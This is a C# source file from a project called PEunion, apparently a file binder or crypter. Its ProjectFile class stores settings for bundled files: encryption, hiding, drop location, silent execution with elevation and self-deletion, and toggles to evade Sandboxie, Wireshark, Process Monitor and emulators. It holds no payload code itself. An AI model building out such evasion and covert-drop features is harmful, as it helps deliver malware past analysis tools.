using BytecodeApi.Extensions;
using BytecodeApi.IO.FileSystem;
using BytecodeApi.Text;
using System.IO;
using System.Linq;
using System.Windows.Media;

namespace PEunion
{
	public class ProjectFile : ProjectItem
	{
		public string FullName
		{
			get => Get(() => FullName);
			set
			{
				Set(() => FullName, value);
				Project.IsDirty = true;
				RaisePropertyChanged(() => SourceDirectory);
				RaisePropertyChanged(() => SourceFileName);
				RaisePropertyChanged(() => SourceFileSize);
			}
		}
		public string Name
		{
			get => Get(() => Name);
			set
			{
				Set(() => Name, value);
				Project.IsDirty = true;
			}
		}
		public ImageSource Icon
		{
			get => Get(() => Icon);
			set => Set(() => Icon, value);
		}
		public bool Compress
		{
			get => Get(() => Compress);
			set
			{
				Set(() => Compress, value);
				Project.IsDirty = true;
			}
		}
		public bool Encrypt
		{
			get => Get(() => Encrypt);
			set
			{
				Set(() => Encrypt, value);
				Project.IsDirty = true;
			}
		}
		public bool Hidden
		{
			get => Get(() => Hidden);
			set
			{
				Set(() => Hidden, value);
				Project.IsDirty = true;
			}
		}
		public int DropLocation
		{
			get => Get(() => DropLocation);
			set
			{
				Set(() => DropLocation, value);
				Project.IsDirty = true;
			}
		}
		public bool Execute
		{
			get => Get(() => Execute);
			set
			{
				Set(() => Execute, value);
				RaisePropertyChanged(() => CanExecuteWait);
				ExecuteWait &= value;
				Runas &= value;
				Project.IsDirty = true;
			}
		}
		public bool ExecuteWait
		{
			get => Get(() => ExecuteWait);
			set
			{
				Set(() => ExecuteWait, value);
				RaisePropertyChanged(() => CanExecuteDelete);
				ExecuteDelete &= value;
				Project.IsDirty = true;
			}
		}
		public bool ExecuteDelete
		{
			get => Get(() => ExecuteDelete);
			set
			{
				Set(() => ExecuteDelete, value);
				Project.IsDirty = true;
			}
		}
		public bool Runas
		{
			get => Get(() => Runas);
			set
			{
				Set(() => Runas, value);
				Project.IsDirty = true;
			}
		}
		public string CommandLine
		{
			get => Get(() => CommandLine);
			set
			{
				Set(() => CommandLine, value);
				Project.IsDirty = true;
			}
		}
		public bool AntiSandboxie
		{
			get => Get(() => AntiSandboxie);
			set
			{
				Set(() => AntiSandboxie, value);
				Project.IsDirty = true;
			}
		}
		public bool AntiWireshark
		{
			get => Get(() => AntiWireshark);
			set
			{
				Set(() => AntiWireshark, value);
				Project.IsDirty = true;
			}
		}
		public bool AntiProcessMonitor
		{
			get => Get(() => AntiProcessMonitor);
			set
			{
				Set(() => AntiProcessMonitor, value);
				Project.IsDirty = true;
			}
		}
		public bool AntiEmulator
		{
			get => Get(() => AntiEmulator);
			set
			{
				Set(() => AntiEmulator, value);
				Project.IsDirty = true;
			}
		}

		public string SourceDirectory => Path.GetDirectoryName(FullName);
		public string SourceFileName => Path.GetFileName(FullName);
		public string SourceFileSize => File.Exists(FullName) ? Wording.FormatByteSizeString(new FileInfo(FullName).Length) : "<file not found>";
		public int DropAction
		{
			get => ExecuteDelete ? 3 : ExecuteWait ? 2 : Execute ? 1 : 0;
			set
			{
				Execute = value >= 1;
				ExecuteWait = value >= 2;
				ExecuteDelete = value >= 3;
			}
		}
		public bool CanExecuteWait => Execute;
		public bool CanExecuteDelete => ExecuteWait;

		public ProjectFile(Project project, string path) : base(project)
		{
			FullName = path;
			Name = Path.GetFileName(FullName);
			Icon = File.Exists(FullName) ? FileEx.GetIcon(FullName, false).ToBitmapSource() : Utility.GetImageResource("IconMissingFile");
			Compress = true;
			Encrypt = true;
			Hidden = true;
			DropLocation = Lookups.DropLocations.Keys.First();
			Execute = true;
		}
	}
}